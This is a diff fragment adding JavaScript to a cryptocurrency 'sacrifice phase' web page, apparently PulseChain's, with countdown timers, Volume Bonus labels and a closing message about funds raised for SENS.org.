+		$('#daysCountDisc').text(`${days-3} day${(days-3)==1?'':'s'} plus the hours above until the Volume Bonus ranking phase up to 2.5x is over. A 1.75x flat Volume Bonus activates for next 3 days after that.`)
+	}
+
+	if (days < 3) {
+		$('#priceLbl').html(rate.toFixed(2)+'$<br>The Volume Bonus ranking is over. Every sacrifice from now on receives a fixed 1.75x Volume Bonus.')
+	} else {
+		$('#priceLbl').html(rate.toFixed(2)+'$')
+	}
+
+	if (leftDays < 1) {
+		$('#timerTitle').text('Sacrifice phase over in')
+		$('#daysCountDisc').hide()
+	} else if (days == 3) {
+		$('#timerTitle').text('Ranked Volume Bonus over in')
+	} else {
+		$('#timerTitle').text('Time until rate increases 5%')
+	}
+
+	const percentDone = (Date.now()/1000 - startUTC) / (endUTC - startUTC)
+	$('#graphLine').css('left', percentDone*100+'%')
+
+	if (Date.now()/1000 > endUTC) {
+		$('#graphLine, #rateLblOuter').hide()
+		$('#timerLbl').text('00:00:00')
+		$('#timerTitle').text('The sacrifice phase is over.')
+		$('#mainTitle').html(`Energy Efficient, Cheaper, Faster,<br class="mainTitleBreak"> Fee-Burning Ethereum fork`)
+		$('#subTitle').html(`The PulseChain sacrifice phase raised over $25,000,000<br class="mainTitleBreak"> for the SENS.org medical research foundation!`)
+	}
+
+	setTimeout(render, 100)
+}
+
+render()
+
+</script>
+
+<script>
+(function () {
+  const second = 1000,
+        minute = second * 60,
+        hour = minute * 60,
+        day = hour * 24;
+
+  let birthday = "December 30 2024 23:00:00 GMT+0700",
+      countDown = new Date(birthday).getTime(),
+      x = setInterval(function() {    
+
+        let now = new Date().getTime(),
+            distance = countDown - now;
+
+        document.getElementById("days").innerText = Math.floor(distance / (day)),
+          document.getElementById("hours").innerText = Math.floor((distance % (day)) / (hour)),
+          document.getElementById("minutes").innerText = Math.floor((distance % (hour)) / (minute)),
+          document.getElementById("seconds").innerText = Math.floor((distance % (minute)) / second);
+
+        //do something later when date is reached
+        if (distance < 0) {
+          let headline = document.getElementById("headline"),
+              countdown = document.getElementById("countdown"),
+              content = document.getElementById("content");
+
+          headline.innerText = "SACRIFICE!";
+          countdown.style.display = "none";
+          content.style.display = "block";
+
+          clearInterval(x);
+        }
+        //seconds
+      }, 0)
+  }());
+</script>
+
+</body></html>
